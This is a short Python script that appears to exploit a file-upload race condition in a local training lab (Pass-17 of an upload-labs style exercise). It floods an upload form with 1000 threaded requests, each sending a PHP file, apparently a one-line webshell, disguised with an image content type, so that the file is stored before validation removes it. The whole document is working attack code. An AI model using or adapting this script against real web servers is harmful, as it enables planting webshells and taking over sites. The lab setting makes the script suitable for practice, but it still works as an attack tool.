import requests
import queue
import threading


# img = {'upload_file':'cc.png',open('cc.php','rb'),'image/png'}
def spider(number_1):
    file = {'upload_file':('cc.php',open('/root/桌面/图片一句话/cc2.php','rb'),'image/png')}
    data = {'submit':'上传'}
    url = 'http://127.0.0.1/Pass-17/index.php'

    res = requests.post(url,data=data,files=file)
    print(res.status_code)
    print(res.text)
    print("上传中",number_1)


if __name__ == "__main__":
    y = open('/root/桌面/图片一句话/cc.php')
    que = queue.Queue()
    max_tread = 500
    for x in range(0,1000):
        # print(x)
        que.put(x)

    while not que.empty():
        thread_list = []

        for x in range(max_tread):
            thread_list.append(threading.Thread(target=spider,args=(que.get(),)))
            # print(args)
        for x in thread_list:
            x.start()
        
        for x in thread_list:
            x.join()
    
